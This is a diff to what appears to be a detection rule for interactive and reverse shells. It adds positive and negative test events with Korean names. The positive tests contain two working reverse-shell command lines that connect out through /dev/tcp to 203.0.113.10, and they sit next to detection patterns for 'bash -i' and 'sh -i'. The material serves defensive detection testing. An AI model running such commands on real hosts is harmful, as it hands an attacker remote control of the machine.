@@ -16,3 +16,26 @@ detection:
       - 'bash -i'
       - 'sh -i'
   condition: selection
+tests:
+  positive:
+    - name: 고전적인 bash 리버스 셸
+      event:
+        Image: /bin/bash
+        CommandLine: bash -i >& /dev/tcp/203.0.113.10/4444 0>&1
+        ParentImage: /usr/sbin/nginx
+    - name: /dev/tcp 로 직접 연결
+      event:
+        Image: /bin/bash
+        CommandLine: exec 3<>/dev/tcp/203.0.113.10/9001
+        ParentImage: /bin/bash
+  negative:
+    - name: 평범한 배포 스크립트
+      event:
+        Image: /bin/bash
+        CommandLine: bash /opt/deploy/release.sh --env prod
+        ParentImage: /usr/lib/systemd/systemd
+    - name: 로그에서 bash 를 grep (대소문자 무시 옵션)
+      event:
+        Image: /usr/bin/grep
+        CommandLine: grep -ri bash /var/log/syslog
+        ParentImage: /bin/bash
